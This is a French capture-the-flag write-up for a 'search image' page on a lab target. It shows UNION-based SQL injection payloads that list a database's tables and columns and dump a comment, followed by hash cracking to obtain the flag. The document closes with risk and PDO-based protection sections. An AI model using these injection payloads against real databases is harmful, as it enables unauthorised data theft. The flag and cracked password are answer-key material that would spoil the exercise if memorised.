# SEARCH IMAGE PAGE

## CIBLE: http://10.12.1.129/?page=searchimg

### PRÉ REQUIS

Aucun.

### INJECTIONS SQL

La commande:
`1=1 UNION SELECT table_schema, table_name FROM information_schema.tables`<br>
permet d'apprendre que dans la base de données `Member_images` se trouve une table unique: `list_images`.

La commande:
`1=1 UNION SELECT table_name, column_name FROM information_schema.columns`<br>
permet d'apprendre que dans la table "list_images" se trouvent les colonnes suivantes:

- id
- url
- title
- comment

Il est donc possible de vérifier le contenu de toutes ces tables.<br>
voici la partie intéressante de la commande:
`1=1 UNION SELECT comment, title FROM list_images`.
```
Hack me ?
If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46
```

### DECRYPT FILE

On peut décrypter le mot de passe grâce au site [md5 decrypt](https://md5decrypt.net/), qui donne: `albatroz`.<br>
On peut crypter ce mot de passe en sha256 grâce au site [md5 decrypt (sha256)](https://md5decrypt.net/Sha256/#answer).<br>
On obtient donc le flag: `f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188`.

## RISQUE

L'accès aux bases SQL permet l'obtention de toutes les données qu'elles contiennent.<br>
Ici, nous avons seulement récupéré un commentaire, mais souvent les mots de passe ainsi que de nombreuses données d'utilisateur sont conservées dans ces bases de données.<br>
C'est par exemple le cas dans la base de données `Member_Brute_Force`.

## PROTECTION

Les injections SQL sont très dangeureuses. Heureusement, il est facile de s'en protéger.<br>
Par exemple avec la fonction PDO (en php), qui va formater la requête avant d'ajouter les paramètres et vérifier le formatage final de la requête avant de la soumettre à la base de données.
